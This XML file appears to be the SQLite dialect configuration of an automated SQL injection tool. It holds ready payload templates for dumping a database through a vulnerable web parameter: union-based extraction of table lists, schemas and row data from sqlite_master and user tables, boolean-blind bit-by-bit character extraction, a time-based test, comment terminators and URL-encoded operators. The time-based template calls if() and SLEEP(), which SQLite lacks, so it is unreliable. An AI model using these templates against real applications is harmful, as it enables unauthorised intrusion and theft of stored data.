<?xml version="1.0" encoding="UTF-8"?>
<model>
    <vendor></vendor>
    <resource>
        <info>
select 
    sqlite_version()
    || '${ENCLOSE_VALUE_SQL}'
    || 'sqlite_master'
    || '${ENCLOSE_VALUE_SQL}'
    || 'anonymous'
    || '${TRAIL_SQL}'
        </info>
        <schema>
            <database>
select 
    '${ENCLOSE_VALUE_SQL}'
    || r
    || '${SEPARATOR_QTE_SQL}'
    || q
    || '${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
from (
    select 
        'sqlite_master' r, 
        count(*) q 
    from sqlite_master 
    WHERE type = 'table'
)
{limit}
            </database>
            <table>
select 
    group_concat(
        '${ENCLOSE_VALUE_SQL}'
        || name
        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}',
        '${SEPARATOR_CELL_SQL}'
    )
    || '${TRAIL_SQL}'
from (
    select * 
    from sqlite_master 
    WHERE type = 'table'
    ORDER BY tbl_name
    {limit}
)
            </table>
            <column>
select 
    sql
    || '${TRAIL_SQL}'
from sqlite_master 
where tbl_name = '${TABLE}'
and type = 'table'
{limit}
            </column>
            <row>
                <query>
select 
    ifnull(
        group_concat(
            '${ENCLOSE_VALUE_SQL}'
            || r
            || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}',
            '${SEPARATOR_CELL_SQL}'
        ),
        ''
    )
    || '${TRAIL_SQL}'
from (
    select distinct ${FIELDS} r 
    from ${TABLE}
    {limit}
)
                </query>
                <fields>
                <field>
trim(
    ifnull(
        ${FIELD}, 
        ''
    )
)
                </field>
                <concat>|| '%7f' ||</concat>
                </fields>
            </row>
        </schema>
    </resource>
    <strategy>
        <configuration>
            <slidingWindow>
(
    select
        '${LEAD}' 
        || substr(
            (${INJECTION}), 
            ${INDEX}, 
            65536
        )
)
            </slidingWindow>
            <limit>limit 65536 offset ${LIMIT}</limit>
            <failsafe>1337${INDICE}7330%2b1</failsafe>
            <calibrator>
replace(
    substr(
        quote(
            zeroblob(
                (65536%2B1) / 2
            )
        ),
        3,
        65536
    ),
    '0',
    '${CALIBRATOR_SQL}'
)
            </calibrator>
            <limitBoundary>0</limitBoundary>
            <endingComment>--+-</endingComment>
            <fingerprint>
                <errorMessage>SQLite</errorMessage>
            </fingerprint>
        </configuration>
        <normal>
            <indices>union select ${INDICES}</indices>
            <capacity>(select '${LEAD}${INDICE}' || ${CALIBRATOR})</capacity>
            <orderBy>order by 1337</orderBy>
        </normal>
        <boolean>
            <test>
                <false>0 = 1</false>
                <false>0 %21= 0</false>
                <false>0.1 %21= 0.1</false>
                <false>1 = 2</false>
                <false>1 %21= 1</false>
                <false>2 %21= 2</false>
                <true>1.2 = 1.2</true>
                <true>0.1 = 0.1</true>
                <true>0 %21= 1</true>
                <true>1 = 1</true>
                <true>2 = 2</true>
                <true>1 %21= 2</true>
                <initialization>0%2b1 = 1</initialization>
                <bit>
unicode(
    substr(
        ${INJECTION}, 
        ${INDEX}, 
        1
    )
) 
%26 ${BIT}
                </bit>
                <length>length(${INJECTION}) > ${INDEX}</length>
            </test>
            <blind>and ${TEST}</blind>
            <time>
and if(
    ${TEST}, 
    1, 
    SLEEP(${SLEEP_TIME})
)
            </time>
        </boolean>
    </strategy>
</model>